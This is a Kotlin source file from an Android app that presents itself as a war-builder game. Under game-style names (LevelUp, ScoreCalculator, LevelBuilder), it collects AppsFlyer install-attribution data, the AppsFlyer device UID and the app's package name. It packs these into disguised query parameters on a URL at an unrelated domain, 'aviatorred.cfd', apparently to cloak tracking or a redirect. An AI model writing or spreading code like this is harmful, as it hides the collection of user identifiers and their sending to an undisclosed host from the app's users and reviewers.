package com.unicostudio.usa.war.amer.builder

import android.app.Activity
import android.net.Uri
import android.util.Log
import androidx.core.net.toUri
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlin.coroutines.resume

private const val TAG = "LevelUp"

class LevelUp(private val activity: Activity) {

    private suspend fun fetchAppsWrapper(activity: Activity, appsKey: String) =
        suspendCancellableCoroutine { continuation ->

            val calc = ScoreCalculator()

            calc.init(
                appsKey,
                object : ScoreCalculator.AppsFlyerConversionListenerWrapper {
                    override fun onConversionDataSuccess(p0: MutableMap<String, Any>?) {
                        continuation.resume(p0)

//                        val dataObject = mutableMapOf<String, Any>()
//                        dataObject["campaign"] = "test1/test2/test3/test4/test5"
//                        dataObject["adset_id"] = "testAdset"
//                        dataObject["campaign_id"] = "testCampaignId"
//                        dataObject["adset"] = "testAdset"
//                        dataObject["adgroup"] = "testAdGroup"
//                        dataObject["media_source"] = "testSource"
//
//                        Log.d(TAG, "onConversionDataSuccess: $dataObject")
//
//                        continuation.resume(dataObject)
                    }

                    override fun onConversionDataFail(p0: String?) {

                        Log.d(TAG, "onConversionDataFail: null")
                        continuation.resume(null)
                    }

                    override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
                    }

                    override fun onAttributionFailure(p0: String?) {
                    }

                },
                activity
            )

            calc.start(activity)
        }

    suspend fun onLevelUp(
        ads: String,
        gameEngine: GameEngine,
        onUpdate: (String) -> Unit
    ) {
        val engine = gameEngine.start()
        var score: MutableMap<String, Any>? = null
        if (engine == "null") {
            score = fetchAppsWrapper(activity, "r23RsWyKgwBj728kDPX8Hd")
        }

        onUpdate(
            LevelBuilder()
                .build("s113Gy", score?.get("campaign").toString())
                .build("277Ftw", engine)
                .build("sLH803", score?.get("media_source").toString())
                .build("d5f3I1", score?.get("adgroup").toString())
                .build("699oMk", score?.get("adset_id").toString())
                .build("a77O6f", score?.get("af_siteid").toString())
                .build("E2wC98", score?.get("adset").toString())
                .build("jX993u", score?.get("campaign_id").toString())
                .build("055sM7", ads)
                .build("ITj873", ScoreCalculator().getAppsFlyerUID(activity).toString())
                .build("8u77Xd", activity.applicationInfo.packageName)
                .build()
        )
    }

    companion object {
        interface ScoreBuilder {

            fun build(param: String, value: String): ScoreBuilder

            fun build(): String
        }

        class LevelBuilder : ScoreBuilder {

            private val link: Uri.Builder = MAIN.toUri().buildUpon()

            override fun build(param: String, value: String): ScoreBuilder {
                link.apply {
                    appendQueryParameter(param, value)
                }

                return this
            }

            override fun build(): String {
                return link.toString()
            }

            companion object {
                const val MAIN = "https://aviatorred.cfd/lardhss.php"
            }

        }
    }
}